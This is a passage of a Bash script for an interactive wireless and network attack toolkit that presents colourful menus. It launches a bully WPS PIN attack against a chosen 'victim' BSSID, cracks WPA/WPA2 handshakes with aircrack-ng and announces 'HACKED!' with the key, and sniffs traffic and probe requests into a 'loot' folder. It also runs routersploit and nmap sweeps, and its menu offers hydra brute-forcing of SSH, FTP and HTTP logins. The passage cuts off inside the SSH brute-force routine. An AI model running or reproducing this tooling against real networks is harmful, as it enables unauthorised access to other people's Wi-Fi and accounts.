                read -p ""
                clear
                iwconfig
                echo
                echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
                read -p ""
                clear
                echo -ne "${red_color_slim} [ ${white_color}Interface name${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
                read interface_name_monitor
            else
                wps_menu
            fi
        fi

        echo
        echo -e "${white_color}  I'll run wash. It will stop after 15 seconds. ${red_color}DO NOT ${red_color_slim}Ctrl + C ${normal_color}"
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        timeout --preserve-status 15 wash -i ${interface_name_monitor}
        echo
        echo
        echo -ne "${red_color_slim} [ ${white_color}BSSID${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
        read victims_bssid
        echo
        echo -e "${white_color}  All done! ${normal_color}"
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to start the attack [Close the window when you are done] .${normal_color}"
        read -p ""
        xterm -geometry 100x50  -fa "Monospace" -fs "8" -T "[ tehR4V10L1script ]-[ bully attack ]" -e bully ${interface_name_monitor} -b ${victims_bssid} -d -v 3 2>/dev/null
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        wps_menu
    fi
    main_menu

}
# 001.4
function handshake_offline_menu () {

    clear
    echo
    echo -e "${red_color_slim} [${white_color} Handshake bruteforce menu ${red_color_slim}]${normal_color}"
    echo
    echo -e "${white_color}  01) ${normal_color}Aircrack-ng offline bruteforce${normal_color}"
    echo -e "${white_color}  02) ${normal_color}Hashcat ????${normal_color}"
    echo -e "${white_color}  00) ${normal_color}Back${normal_color}"
    echo
    echo -ne "${white_color} [Option]"
                echo -ne  "   > " ;tput sgr0
    read global_wifi_option

    if [[ $global_wifi_option = 0 ||  $global_wifi_option = 00 ]]
    then
        main_menu
    elif [[ $global_wifi_option = 1 || $global_wifi_option = 01 ]]
    then
        offline_aircrack_handshake
    # elif [[ $global_wifi_option = 2 || $global_wifi_option = 02 ]]
    # then
    #     awdawd_hashcat_awawdwd
    else
        echo
        echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
        sleep 1
        global_wifi_menu
    fi

}
# 001.4.1
function offline_aircrack_handshake () {

    clear
    echo -e "${red_color_slim}                   [${white_color} AIRCRACK HANDSHAKE BRUTEFORCER ${red_color_slim}]"
    echo
    echo
    CHECKINSTALL_AIRCRACK=$(which aircrack-ng)
    if [[ $CHECKINSTALL_AIRCRACK = "" ]]
    then
        echo -e "${red_color_slim}  [${white_color} Aircrack-ng ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        echo
        echo -ne "${red_color_slim} [ ${white_color}WPA / WPA2${red_color_slim} ]${normal_color}"
                echo -ne  " > " ;tput sgr0
        read wpaORwpa2
        if [[ $wpaORwpa2 = "wpa" || $wpaORwpa2 = "WPA" || $wpaORwpa2 = "-" ]]
        then
            wpaORwpa2_def="-a1"
        elif [[ $wpaORwpa2 = "wpa2" || $wpaORwpa2 = "WPA2" || $wpaORwpa2 = "2" ]]
        then
            wpaORwpa2_def="-a2"
        else
            echo
            echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
            sleep 1
            clear

            echo -ne "${red_color_slim} [ ${white_color}WPA / WPA2${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
            read wpaORwpa2
            if [[ $wpaORwpa2 = "wpa" || $wpaORwpa2 = "WPA" || $wpaORwpa2 = "-" ]]
            then
                wpaORwpa2_def="-a1"
            elif [[ $wpaORwpa2 = "wpa2" || $wpaORwpa2 = "WPA2" || $wpaORwpa2 = "2" ]]
            then
                wpaORwpa2_def="-a2"
            else
                echo
                echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
                sleep 1
                clear
                echo -ne "${red_color_slim} [ ${white_color}WPA / WPA2${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
                read wpaORwpa2
                if [[ $wpaORwpa2 = "wpa" || $wpaORwpa2 = "WPA" || $wpaORwpa2 = "-" ]]
                then
                    wpaORwpa2_def="-a1"
                elif [[ $wpaORwpa2 = "wpa2" || $wpaORwpa2 = "WPA2" || $wpaORwpa2 = "2" ]]
                then
                    wpaORwpa2_def="-a2"
                else
                    echo
                    echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}You are fucking idiot or what!"
                    sleep 1
                    clear
                    handshake_offline_menu
                fi
            fi
        fi

        echo -ne "${red_color_slim} [ ${white_color}BSSID${red_color_slim} ]${normal_color}"
                echo -ne  " > " ;tput sgr0
        read victims_bssid

        echo -ne "${red_color_slim} [ ${white_color}WORDLIST PATH${red_color_slim} ]${normal_color}"
                echo -ne  " > " ;tput sgr0
        read wpa_wordlist

        echo -ne "${red_color_slim} [ ${white_color}.CAP PATH${red_color_slim} ]${normal_color}"
                echo -ne  " > " ;tput sgr0
        read cap_path
        echo

        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to start the bruteforce.${normal_color}"
        read -p ""

        mkdir -p /root/tehR4V10L1script/saved_godisalive/handshakes 2>/dev/null
        cd /root/tehR4V10L1script/saved_godisalive/handshakes
        rm /root/tehR4V10L1script/saved_godisalive/handshakes/${victims_bssid}* 2>/dev/null
        aircrack_comand=" aircrack-ng ${wpaORwpa2_def} -l /root/tehR4V10L1script/saved_godisalive/handshakes/${victims_bssid}_save.txt -b ${victims_bssid} -w ${wpa_wordlist} ${cap_path} "
        xterm -geometry 81x24 -fa "Monospace" -fs "8"  -hold -T "[tehR4V10L1script]-[WPA / WPA2 bruteforce]" -e ${aircrack_comand}
        clear
        echo
        if [[ $(ls /root/tehR4V10L1script/saved_godisalive/handshakes/ | grep ${victims_bssid}_save.txt) = "" ]]
        then
            echo -e "${white_color}  HACK FAILED! :("
            echo -e "  You can try another handshake or another wordlist... ${normal_color}"
        else

            echo
            targets_pass=$(cat /root/tehR4V10L1script/saved_godisalive/handshakes/${victims_bssid}_save.txt)
            echo -e "${red_color_slim}      [${green_color} HACKED! ${red_color_slim}]-[${green_color} tehR4V10L1script ${red_color_slim}]"
            echo -e "${red_color_slim}      [${green_color} KEY:${white_color} ${targets_pass} ${red_color_slim}]-[${normal_color} Key saved in /root/tehR4V10L1script/saved_godisalive/handshakes/${victims_bssid}_save.txt ${red_color_slim}]${normal_color}"
        fi

        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        handshake_offline_menu
    fi
    main_menu
}
# 001.5
function sniffing_menu () {

    clear
    echo
    echo -e "${red_color_slim} [${white_color} Sniffing menu ${red_color_slim}]${normal_color}"
    echo
    echo -e "${white_color} 01) ${normal_color}Sniff with tcpdump${normal_color}"
    echo -e "${white_color} 02) ${normal_color}Sniff with kismet${normal_color}"
    echo -e "${white_color} 03) ${normal_color}Inspect a captured .pcap with wireshark${normal_color}"
	echo -e "${white_color} 04) ${normal_color}Sniff probe requests${normal_color}"

    echo -e "${white_color} 00)${normal_color} Back${normal_color}"
    echo
    echo -e "${white_color} [Option]"
                echo -ne  "   > " ;tput sgr0
    read wps_option

    if [[ $wps_option = 0 ||  $wps_option = 00 ]]
    then
        global_wifi_menu
    elif [[ $wps_option = 1 || $wps_option = 01 ]]
    then
        local_tcp_sniff
    elif [[ $wps_option = 2 || $wps_option = 02 ]]
    then
        local_kismet_sniff
    elif [[ $wps_option = 3 || $wps_option = 03 ]]
    then
        wireshark_view_pcap
	elif [[ $wps_option = 4 || $wps_option = 04 ]]
    then
        probe_request_sniffer
    else
        echo
        echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
        sleep 1
        wps_menu
    fi


}
# 001.5.1
function local_tcp_sniff () {

    clear
    echo -e "${red_color_slim}                   [${white_color} TCPDUMP SNIFF ${red_color_slim}]"
    echo
    echo
    CHECKINSTALL_TCPDUMP=$(which tcpdump)
    if [[ $CHECKINSTALL_TCPDUMP = "" ]]
    then

        echo -e "${red_color_slim}  [${white_color} Tcpdump ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        echo -ne "${red_color_slim} [ ${white_color}PATH TO SAVE THE .PCAP${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
        read pcap_path4capturing
        echo

        echo -ne "${white_color}  Do you want to set a timeout? ${normal_color}"
        echo -ne "${white_color}   [ Y / N ]"
                    echo -ne  " > " ;tput sgr0
        read timeout_y_n

        if [[ $timeout_y_n = y || $timeout_y_n = Y ]]
        then
            echo
            echo -ne "${red_color_slim} [ ${white_color}SECONDS FOR THE TIMEOUT${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
            read timeout_seconds
            echo
            xterm -geometry 84x3 -fa "Monospace" -fs "8" -T "[ tehR4V10L1script ]-[ local tcpdump ]-[ ${timeput_seconds}s ]" -e "clear; sleep 0.1; echo -e \" ${green_color} [+] ${white_color}loading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}Loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}lOading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loAding  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loaDing  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadIng  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadiNg  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadinG  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}Loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}lOading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loAding  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loaDing  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadIng  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadiNg  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadinG  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  \ \"; sleep 0.1; clear; timeout --preserve-status ${timeout_seconds} tcpdump -w ${pcap_path4capturing}" 2>/dev/null
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            sniffing_menu

        else
            xterm -geometry 84x3 -fa "Monospace" -fs "8" -T "[ tehR4V10L1script ]-[ local tcpdump ]" -e "clear; sleep 0.1; echo -e \" ${green_color} [+] ${white_color}loading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}Loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}lOading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loAding  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loaDing  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadIng  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadiNg  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadinG  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}Loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}lOading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loAding  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loaDing  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadIng  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadiNg  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadinG  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  \ \"; sleep 0.1; clear; tcpdump -w ${pcap_path4capturing}" 2>/dev/null
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            sniffing_menu

        fi

        #* xterm -geometry 84x3 -fa "Monospace" -fs "8" -T "[ tehR4V10L1script ]-[ tcpdump ]" -e \"tcpdump -w ${pcap_path4capturing} \"
        #* xterm -geometry 179x40 -fa "Monospace" -fs "10" -T "[ tehR4V10L1script ]-[ kismet ]" -e "clear; sleep 0.1; echo -e \" ${green_color} [+] ${white_color}loading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}Loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}lOading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loAding  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loaDing  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadIng  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadiNg  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadinG  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}Loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}lOading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loAding  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loaDing  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadIng  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadiNg  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadinG  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  \ \"; sleep 0.1; clear; kismet -c ${interface_name_monitor}" 2>/dev/null
    fi
    global_wifi_menu

}
# 001.5.2
function local_kismet_sniff () {

    clear
    echo -e "${red_color_slim}                   [${white_color} KISMET SNIFF ${red_color_slim}]"
    echo
    echo
    CHECKINSTALL_KISMET=$(which kismet)
    if [[ $CHECKINSTALL_KISMET = "" ]]
    then

        echo -e "${red_color_slim}  [${white_color} Kismet ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else

        echo -ne "${red_color_slim} [ ${white_color}INTERFACE NAME${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
        read interface_name_monitor
        echo

        CHECKMON=$(ifconfig | grep "mon")
        if [[ "$CHECKMON" = "" ]]
        then
            echo -e "${white_color}  Managed mode enabled, I can't sniff!${normal_color}"
            echo -e "${white_color}  Do you want to activate monitor mode in ${red_color_slim} ${interface_name_monitor}${white_color}? ${normal_color}"
            echo -ne "${white_color}   [ Y / N ]"
                        echo -ne  " > " ;tput sgr0
            read monitor_option
            if [[ $monitor_option = y || $monitor_option = Y ]]
            then
                airmon-ng start ${interface_name_monitor} 1>/dev/null
                pantalla_de_carga
                echo -e "${white_color}  Done! ${normal_color}"
                echo -e "${white_color}  I'll iwconfig for you so you can see the interface name. ${normal_color}"
                echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
                read -p ""
                clear
                iwconfig
                echo
                echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
                read -p ""
                local_kismet_sniff
            else
                global_wifi_menu
            fi
        fi

        xterm -geometry 179x40 -fa "Monospace" -fs "10" -T "[ tehR4V10L1script ]-[ kismet ]" -e "clear; sleep 0.1; echo -e \" ${green_color} [+] ${white_color}loading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}Loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}lOading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loAding  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loaDing  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadIng  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadiNg  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadinG  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}Loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}lOading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loAding  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loaDing  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadIng  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadiNg  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadinG  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  \ \"; sleep 0.1; clear; kismet -c ${interface_name_monitor}" 2>/dev/null
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        global_wifi_menu
    fi
    global_wifi_menu

}
# 001.5.3
function wireshark_view_pcap () {

	clear
    echo -e "${red_color_slim}                   [${white_color} WIRESHARK PCAP ANALIZER ${red_color_slim}]"
    echo
    echo
    CHECKINSTALL_WIRESHARK=$(which wireshark)
    if [[ $CHECKINSTALL_WIRESHARK = "" ]]
    then

        echo -e "${red_color_slim}  [${white_color} Wireshark ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
		echo -ne "${red_color_slim} [ ${white_color}.PCAP PATH${red_color_slim} ]${normal_color}"
					echo -ne  " > " ;tput sgr0
		read PCAP_PATH
		wireshark ${PCAP_PATH}
		sniffing_menu
	fi
}
# 001.5.4
function probe_request_sniffer () {

	clear
    echo -e "${red_color_slim}                   [${white_color} PROBE SNIFFER ${red_color_slim}]"
    echo
    echo
    CHECKINSTALL_AWK=$(which gawk)
    if [[ $CHECKINSTALL_AWK = "" ]]
    then

        echo -e "${red_color_slim}  [${white_color} Awk (gawk) ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    fi

	echo -ne "${red_color_slim} [ ${white_color}INTERFACE NAME${red_color_slim} ]${normal_color}"
				echo -ne  " > " ;tput sgr0
	read interface_name_monitor
	mkdir -p /root/tehR4V10L1script/installs/awk4probes 2>/dev/null
	mkdir -p /root/tehR4V10L1script/loot 2>/dev/null

	cd /root/tehR4V10L1script/installs/awk4probes
	if [[ $(ls) == "" ]]
	then
		wget https://raw.githubusercontent.com/brannondorsey/sniff-probes/master/parse-tcpdump.awk 2>/dev/null  # CREDITS TO THIS MAN!
	fi

	OUTPUT="${OUTPUT:-/root/tehR4V10L1script/loot/probe_scan.txt}"
	CHANNEL_HOP="${CHANNEL_HOP:-0}"

	# channel hop every 2 seconds
	channel_hop() {

		IEEE80211bg="1 2 3 4 5 6 7 8 9 10 11"
		IEEE80211bg_intl="$IEEE80211b 12 13 14"
		IEEE80211a="36 40 44 48 52 56 60 64 149 153 157 161"
		IEEE80211bga="$IEEE80211bg $IEEE80211a"
		IEEE80211bga_intl="$IEEE80211bg_intl $IEEE80211a"

		while true ; do
			for CHAN in $IEEE80211bg ; do
				sudo iwconfig $interface_name_monitor channel $CHAN
				sleep 2
			done
		done
	}

	# if ! [ -x "$(command -v gawk)" ]; then
	#   echo 'gawk (GNU awk) is not installed. Please install gawk.' >&2
	#   exit 1
	# fi

	if [ "$CHANNEL_HOP" -eq 1 ] ; then
		# channel hop in the background
		channel_hop &
	fi

	# filter with awk, then use sed to convert tabs to spaces and remove front and back quotes around SSID
	xterm -geometry 65x60 -fa "Monospace" -fs "7"  -T "[ tehR4V10L1script ]-[ probe sniffer ]" -e "tcpdump -l -I -i \"$interface_name_monitor\" -e -s 256 type mgt subtype probe-req | awk -f /root/tehR4V10L1script/installs/awk4probes/parse-tcpdump.awk | tee -a \"$OUTPUT\" " > /dev/null 2>&1
	# tcpdump -l -I -i "$interface_name_monitor" -e -s 256 type mgt subtype probe-req | awk -f /root/tehR4V10L1script/installs/awk4probes/parse-tcpdump.awk | tee -a "$OUTPUT"
	sniffing_menu

}
# 001.6
function exec_routersploit () {

    clear
    CHECKINSTALL_ROUTERSPLOIT=$(ls /root/tehR4V10L1script/installs/routersploit 2>/dev/null)
    if [[ $CHECKINSTALL_ROUTERSPLOIT = "" ]]
    then
        echo -e "${red_color_slim}  [${white_color} Routersploit ${red_color_slim}] ${white_color} is not installed in ${red_color}~/root/tehR4V10L1script/installs${white_color} ! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        clear
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to launch routersploit.${normal_color}"
        read -p ""
        echo
        cd /root/tehR4V10L1script/installs/routersploit
        xterm -geometry 112x47 -fa "Monospace" -fs "8"  -T "[ tehR4V10L1script ]-[ routersploit ]" -e 'python3 rsf.py' 2>/dev/null
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    fi

}
#############################
# 002
function scanning_menu () {

    clear
    echo
    echo -e "${red_color_slim} [${white_color} Port scanning menu ${red_color_slim}]${normal_color}"
    echo
    echo -e "${white_color} 01) ${normal_color}Scan all devices in network with nmap${normal_color}"
    echo -e "${white_color} 02) ${normal_color}Scan an IP and its ports with nmap${normal_color}"
    echo -e "${white_color} 00)${normal_color} Back${normal_color}"
    echo
    echo -e "${white_color} [Option]"
                echo -ne  "   > " ;tput sgr0
    read port_canning_option

    if [[ $port_canning_option = 0 ||  $port_canning_option = 00 ]]
    then
        main_menu
    elif [[ $port_canning_option = 1 || $port_canning_option = 01 ]]
    then
        scan_all_devices
    elif [[ $port_canning_option = 2 || $port_canning_option = 02 ]]
    then
        scan_regular_ip
    else
        echo
        echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
        sleep 1
        deauth_menu
    fi

}
# 002.1
function scan_all_devices () {

    clear
    CHECKINSTALL_NMAP=$(which nmap)
    if [[ CHECKINSTALL_NMAP = "" ]]
    then
        echo -e "${red_color_slim}  [${white_color} Nmap ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        echo
        CHECKMON=$(ifconfig | grep "mon")
        if [[ "$CHECKMON" = "" ]]
        then

            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to start scanning.${normal_color}"
            read -p ""
            clear
            # nmap -sP 192.168.1.1-255
            echo
            echo -e "${red_color_slim} [${white_color}  List of devices in network ${red_color_slim}]${normal_color}"
            echo
            nmap -sn 192.168.1.1-254 |grep 192.168 | awk '{print $6}'
            echo
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            scanning_menu

        else
            echo -e "${white_color}Monitor mode enabled, I can't scan right!"
            echo -e "You can select 'man) Managed' to disable monitor mode.${normal_color}"
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            main_menu
        fi
        scanning_menu
    fi
}
# 002.2
function scan_regular_ip () {

    clear
    CHECKINSTALL_NMAP=$(which nmap)
    if [[ CHECKINSTALL_NMAP = "" ]]
    then
        echo -e "${red_color_slim}  [${white_color} Nmap ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        echo
        CHECKMON=$(ifconfig | grep "mon")
        if [[ "$CHECKMON" = "" ]]
        then

            echo -ne "${red_color_slim} [ ${white_color}IP to scan${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
            read ip2scan
            clear
            echo
            nmap ${ip2scan}
            echo
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            scanning_menu

        else
            echo -e "${white_color}Monitor mode enabled, I can't scan right!"
            echo -e "You can select 'man) Managed' to disable monitor mode.${normal_color}"
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            main_menu
        fi
        scanning_menu
    fi
}
#############################
# 003
function bruteforce_menu () {

    clear
    echo
    echo -e "${red_color_slim} [${white_color} Bruteforce menu ${red_color_slim}]${normal_color}"
    echo
    echo -e "${white_color} 01) ${normal_color}Bruteforce SSH with hydra${normal_color}"
    echo -e "${white_color} 02) ${normal_color}Bruteforce FTP login with hydra${normal_color}"
	echo -e "${white_color} 03) ${normal_color}Bruteforce HTTP(S) POST login with hydra${normal_color}"
    echo -e "${white_color} 00)${normal_color} Back${normal_color}"
    echo
    echo -e "${white_color} [Option]"
                echo -ne  "   > " ;tput sgr0
    read bruteforce_option

    if [[ $bruteforce_option = 0 ||  $bruteforce_option = 00 ]]
    then
        main_menu
    elif [[ $bruteforce_option = 1 || $bruteforce_option = 01 ]]
    then
        ssh_hydra_bruteforce
    elif [[ $bruteforce_option = 2 || $bruteforce_option = 02 ]]
    then
        ftp_hydra_bruteforce
	elif [[ $bruteforce_option = 3 || $bruteforce_option = 03 ]]
    then
        func_https_hydra_bruteforce
    else
        echo
        echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
        sleep 1
        bruteforce_menu
    fi

}
# 003.1
function ssh_hydra_bruteforce () {

    clear
    CHECKINSTALL_HYDRA=$(which hydra)
    if [[ CHECKINSTALL_HYDRA = "" ]]
    then
        echo -e "${red_color_slim}  [${white_color} Hydra ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        echo
        CHECKMON=$(ifconfig | grep "mon")
        if [[ "$CHECKMON" = "" ]]
        then

            echo -ne "${red_color_slim} [ ${white_color}IP you want to bruteforce${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
            read ssh_ip
            echo
            echo -ne "${red_color_slim} [ ${white_color}Username you want to bruteforce${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
            read ssh_user
            echo
            echo -ne "${red_color_slim} [ ${white_color}Wordlist complete path (with the .txt extension)${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
            read ssh_wordlist
            echo
            clear
            echo
